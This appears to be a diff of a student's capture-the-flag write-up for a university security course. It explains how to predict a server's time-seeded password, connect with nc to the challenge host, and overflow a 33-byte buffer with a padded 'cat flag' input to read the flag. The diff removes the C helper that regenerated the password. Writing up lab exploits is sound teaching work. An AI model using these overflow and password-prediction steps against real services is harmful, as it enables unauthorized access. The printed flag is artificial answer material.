@@ -24,39 +24,7 @@ CMSC389R-{expl017-2-w1n}
 If you generate the password the same way as in server.c and print it, it is possible to generate the password the same way which is a major vulnerability of the program. Taking the password generating code from server.c directly I would generate the password (i added loop of 5 time of doing this password generation bc time delays and finally was able to figure out how to make it work for about the 2nd of so password generated. I was originally thinking of generating a python script but for the sake of simplicity decided to just do ./a.out && nc ec2-18-222-89-163.us-east-2.compute.amazonaws.com 1337 where a.out was my executable. After finally escalating privilege I realized that using the 4th option i can exploit the buffer overflow error. I noted that the buff variable is 33 bytes/characters. The command cat flag which shows the flag is only 8 chars long. I want to add the command into that part of memory to allow the command to be used. To deal with this I had to add 25 spaces after to deal with the rest of the buffer. Then after adding it to the list of available commands I wanted to execute it making what I executed be "cat flag                         cat flag". After multiple tries I remembered that I needed 25 spaces again to fill the buffer size properly making my input "cat flag                         cat flag                         ".
 
 my c script findpass.c
-#include <stdio.h>
-#include <stdlib.h>
-#include <stdint.h>
-#include <string.h>
-#include <time.h>
-#include <unistd.h>
-#define BUFF_SIZE 32
-#define FLAG_SIZE 32
-#define PASS_SIZE 16
 
-int main(void) {
-    int i, prompt_response;
-    /* password for admin to provide to dump flag */
-    char *password;
-    /* true if user is admin */
-    uint8_t admin;
-    int n=5;
-    /* seed random with time so that we can password */
-    while (n>0){
-    srand(time(0));
-    admin = 0;
-    password = calloc(1, PASS_SIZE+1);
-    for (i = 0; i < PASS_SIZE; i++) {
-        password[i] = rand() % ('z'-' ') + ' ';
-    }
-    password[PASS_SIZE] = 0;
-    printf("%s\n", password);
-    /*free(password);*/
-    n=n-1;
-    sleep(1);
-    }
-    return 0;
-}
 
 
 
